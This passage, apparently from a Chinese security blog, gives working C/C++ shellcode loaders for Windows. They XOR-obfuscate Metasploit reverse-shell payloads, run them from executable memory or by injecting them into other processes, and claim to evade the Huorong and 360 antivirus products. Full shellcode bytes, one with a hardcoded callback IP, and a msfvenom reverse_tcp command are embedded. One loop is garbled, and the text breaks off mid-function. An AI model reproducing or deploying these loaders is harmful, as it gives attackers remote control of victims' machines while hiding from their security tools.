href="#xor异或-VirtualAlloc-CreateThread-x3D-x3D-x3D-x3D-gt-可以免杀逃避火绒和360" class="headerlink" title="xor异或 + VirtualAlloc + CreateThread&#x3D;&#x3D;&#x3D;&#x3D;&gt;可以免杀逃避火绒和360"></a>xor异或 + VirtualAlloc + CreateThread&#x3D;&#x3D;&#x3D;&#x3D;&gt;可以免杀逃避火绒和360</h3><p>利用xor异或对shellcode进行混淆编码</p><blockquote><p>shellcode_xor.cpp</p><blockquote><ul><li>输出一次异或和两次异或后的shellcode</li><li>配合下面的C++loader-7一起使用</li></ul></blockquote></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span><span class="comment">//循环的将shellcode中的十六进制数据和password进行异或加密~~</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> password = <span class="number">0xAA</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enShellCode[<span class="number">10000</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> deShellCode[<span class="number">10000</span>];</span><br><span class="line">    <span class="type">int</span> nLen = <span class="built_in">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// encode </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        enShellCode[i] = buf[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, enShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// decode</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        deShellCode[i] = enShellCode[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%x&quot;</span>, deShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-loader-7"><a href="#C-loader-7" class="headerlink" title="C++loader-7"></a>C++loader-7</h2><blockquote><ul><li>加载异或后的shellcode，并执行上线，可过火绒和360</li><li>经过混淆的shellcode确实比较好用~~~</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> shellcode_size = <span class="number">0</span>;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;xor异或后的shellcode代码&quot;</span>;</span><br><span class="line">    shellcode_size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// XOR异或</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;shellcode_size; i��)&#123;</span><br><span class="line">        buf[i] ^= <span class="number">0xAA</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> * shellcode = (<span class="type">char</span> *)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">//基址</span></span><br><span class="line">        shellcode_size, <span class="comment">//内存大小</span></span><br><span class="line">        MEM_COMMIT, <span class="comment">//内存页状态</span></span><br><span class="line">        PAGE_EXECUTE_READWRITE  <span class="comment">//可读可写可执行</span></span><br><span class="line">        );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line">    </span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="number">0</span>,  <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="number">0</span>,  <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode,  <span class="comment">// 函数</span></span><br><span class="line">        <span class="number">0</span>,  <span class="comment">// 参数</span></span><br><span class="line">        <span class="number">0</span>,  <span class="comment">// 线程标志</span></span><br><span class="line">        <span class="number">0</span>   <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//一直等待线程执行结束</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread,INFINITE);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="asm-loader-c"><a href="#asm-loader-c" class="headerlink" title="asm_loader_c"></a>asm_loader_c</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x1a\x0a\x7c\x47\x2d\x1c\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">void</span> *exec = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;pushq %1\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;ret\n\t&quot;</span></span><br><span class="line">    :<span class="string">&quot;=r&quot;</span>(b)</span><br><span class="line">    :<span class="string">&quot;r&quot;</span>(exec)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 使用内联汇编插入两条汇编指令</span></span><br><span class="line"><span class="comment">// push 和 ret.push 指令将操作数压入栈顶，然后ret指令将rip指向栈顶</span></span><br><span class="line"><span class="comment">// rip 寄存器：指令指针，指向下一个要执行的指令</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="asm-loader-cpp"><a href="#asm-loader-cpp" class="headerlink" title="asm_loader_cpp"></a>asm_loader_cpp</h2><blockquote><p>该加载器有很多汇编代码</p></blockquote><h3 id="vs-x64-编译"><a href="#vs-x64-编译" class="headerlink" title="vs x64 编译"></a>vs x64 编译</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x28\x03\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4d\x5a\x68\x4e\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x30\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x31\x49\x45\x38\x5f\x76\x31\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x33\x39\x2e\x31\x35\x35\x2e\x34\x39\x2e\x34\x33\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 利用GetProcAddress函数，获取 VirtualAlloc 函数指针的地址</span></span><br><span class="line">    LPVOID lp = <span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibraryA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> dw_size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line">    <span class="type">void</span>* exec = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 调用virtualalloc的参数从后往前依次压入栈中，最后将VirtualAlloc的函数指针放入eax, 然后call eax。这里VirtualAlloc返回分配的内存指针，返回值放在eax中，然后把eax的值保存到遍历exec里供之后使用</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//VirtualAlloc需要的参数(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span></span><br><span class="line">    <span class="comment">//注意：压栈顺序从后往前</span></span><br><span class="line">   <span class="comment">//MOV 指令将源操作数复制到目的操作数。作为数据传送（data transfer）指令，它几乎用在所有程序中。在它的基本格式中，第一个操作数是目的操作数，第二个操作数是源操作数：</span></span><br><span class="line"><span class="comment">//MOV destination,source</span></span><br><span class="line">    __asm<span class="comment">//64位系统会有一点区别</span></span><br><span class="line">    &#123;</span><br><span class="line">        push <span class="number">0x40</span>;</span><br><span class="line">        push <span class="number">0x1000</span>;</span><br><span class="line">        mov eax,dw_size;</span><br><span class="line">        push eax;</span><br><span class="line">        push <span class="number">0</span>;</span><br><span class="line">        mov eax, lp;</span><br><span class="line">        call eax;</span><br><span class="line">        mov exec, eax;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 利用GetProcAddress函数，获取RtlMoveMemory的函数指针</span></span><br><span class="line">    LPVOID op = <span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibraryA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;RtlMoveMemory&quot;</span>);</span><br><span class="line">    <span class="comment">// 将RtlMoveMemory的参数从后往前依次入栈，最后把RtlMoveMemory的指针放到eax,再call eax</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">    mov eax, dw_size;</span><br><span class="line">    push eax;</span><br><span class="line">    lea eax, buf</span><br><span class="line">    push eax</span><br><span class="line">    mov ecx, exec</span><br><span class="line">    push ecx</span><br><span class="line">    mov eax, op;</span><br><span class="line">    call eax;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 跳转到之前分配的内存中执行</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">    jmp exec;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>C语言函数调用预定：<a href="http://www.pingtaimeng.com/article/detail/id/721649">http://www.pingtaimeng.com/article/detail/id/721649</a></p></blockquote><p>计算机提供了一种被称为栈的数据结构来支持参数传递。</p><p>栈是一种先进后出的数据结构，栈有一个存储区、一个栈顶指针。栈顶指针指向堆栈中第一个可用的数据项（被称为栈顶）。用户可以在栈顶上方向栈中加入数据，这个操作被称为压栈(Push)，压栈以后，栈顶自动变成新加入数据项的位置，栈顶指针也随之修改。用户也可以从堆栈中取走栈顶，称为弹出栈(pop)，弹出栈后，栈顶下的一个元素变成栈顶，栈顶指针随之修改。</p><p>函数调用时，调用者依次把参数压栈，然后调用函数，函数被调用以后，在堆栈中取得数据，并进行计算。函数计算结束以后，或者调用者、或者函数本身修改堆栈，使堆栈恢复原装。</p><h2 id="InjectShellcodeXor（集大成者）"><a href="#InjectShellcodeXor（集大成者）" class="headerlink" title="InjectShellcodeXor（集大成者）"></a>InjectShellcodeXor（集大成者）</h2><blockquote><p>结合了C++loader-5和6，7的特点，本质上是注入进程，再加上将shellcode进行混淆</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">// msf生成shellcode：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.81.234 lport=7890 -f c -o raw.c</span></span><br><span class="line"><span class="comment">// 使用xor加密Shellcode</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\x56\xe2\x29\x4e\x5a\x42\x66\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xe2\x9b\x78\xcf\xe2\x21\xf8\xca\xe2\x21\xf8\xb2\xfb\xe2\x21\xf8\x8a\xfc\xe2\x21\xd8\xfa\xe7\x9b\x63\xe2\xa5\x1d\xe0\xe0\xe2\x9b\x6a\x6\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47\xf8\xeb\xfb\xe2\x21\xf8\x8a\x21\xe8\x96\xe2\xab\x7a\xcc\x2b\xd2\xb2\xa1\xa8\xa5\x2f\xd8\xaa\xaa\xaa\x21\x2a\x22\xaa\xaa\xaa\xe2\x2f\x6a\xde\xcd\xe2\xab\x7a\xfa\x21\xe2\xb2\xee\x21\xea\x8a\xe3\xab\x7a\x49\xfc\xe2\x55\x63\xeb\x21\x9e\x22\xe2\xab\x7c\xe7\x9b\x63\xe2\x9b\x6a\x6\xeb\x6b\x63\xa7\xeb\xab\x6b\x92\x4a\xdf\x5b\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x72\xf2\xee\x21\xea\x8e\xe3\xab\x7a\xcc\xeb\x21\xa6\xe2\xee\x21\xea\xb6\xe3\xab\x7a\xeb\x21\xae\x22\xe2\xab\x7a\xeb\xf2\xeb\xf2\xf4\xf3\xf0\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb\xf3\xf0\xe2\x21\xb8\x43\xe1\x55\x55\x55\xf7\xe3\x14\xdd\xd9\x98\xf5\x99\x98\xaa\xaa\xeb\xfc\xe3\x23\x4c\xe2\x2b\x46\xa\xab\xaa\xaa\xe3\x23\x4f\xe3\x16\xa8\xaa\xb4\x78\x6a\x2\xfb\x40\xeb\xfe\xe3\x23\x4e\xe6\x23\x5b\xeb\x10\xe6\xdd\x8c\xad\x55\x7f\xe6\x23\x40\xc2\xab\xab\xaa\xaa\xf3\xeb\x10\x83\x2a\xc1\xaa\x55\x7f\xc0\xa0\xeb\xf4\xfa\xfa\xe7\x9b\x63\xe7\x9b\x6a\xe2\x55\x6a\xe2\x23\x68\xe2\x55\x6a\xe2\x23\x6b\xeb\x10\x40\xa5\x75\x4a\x55\x7f\xe2\x23\x6d\xc0\xba\xeb\xf2\xe6\x23\x48\xe2\x23\x53\xeb\x10\x33\xf\xde\xcb\x55\x7f\x2f\x6a\xde\xa0\xe3\x55\x64\xdf\x4f\x42\x39\xaa\xaa\xaa\xe2\x29\x46\xba\xe2\x23\x48\xe7\x9b\x63\xc0\xae\xeb\xf2\xe2\x23\x53\xeb\x10\xa8\x73\x62\xf5\x55\x7f\x29\x52\xaa\xd4\xff\xe2\x29\x6e\x8a\xf4\x23\x5c\xc0\xea\xeb\xf3\xc2\xaa\xba\xaa\xaa\xeb\xf2\xe2\x23\x58\xe2\x9b\x63\xeb\x10\xf2\xe\xf9\x4f\x55\x7f\xe2\x23\x69\xe3\x23\x6d\xe7\x9b\x63\xe3\x23\x5a\xe2\x23\x70\xe2\x23\x53\xeb\x10\xa8\x73\x62\xf5\x55\x7f\x29\x52\xaa\xd7\x82\xf2\xeb\xfd\xf3\xc2\xaa\xea\xaa\xaa\xeb\xf2\xc0\xaa\xf0\xeb\x10\xa1\x85\xa5\x9a\x55\x7f\xfd\xf3\xeb\x10\xdf\xc4\xe7\xcb\x55\x7f\xe3\x55\x64\x43\x96\x55\x55\x55\xe2\xab\x69\xe2\x83\x6c\xe2\x2f\x5c\xdf\x1e\xeb\x55\x4d\xf2\xc0\xaa\xf3\xe3\x6d\x68\x5a\x1f\x8\xfc\x55\x7f&quot;</span>;</span><br><span class="line"><span class="comment">//注入进程</span></span><br><span class="line"><span class="function">BOOL <span class="title">InjectShellCode</span><span class="params">(<span class="type">int</span> Pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE Handle, remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    <span class="type">int</span> password = <span class="number">0xAA</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ShellCode[<span class="number">10000</span>];</span><br><span class="line">    <span class="type">int</span> nLen = <span class="built_in">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//将shellcode还原</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    ShellCode[i] = buf[i] ^ password;</span><br><span class="line"><span class="comment">//     printf(&quot;\\x%x&quot;, ShellCode[i]);</span></span><br><span 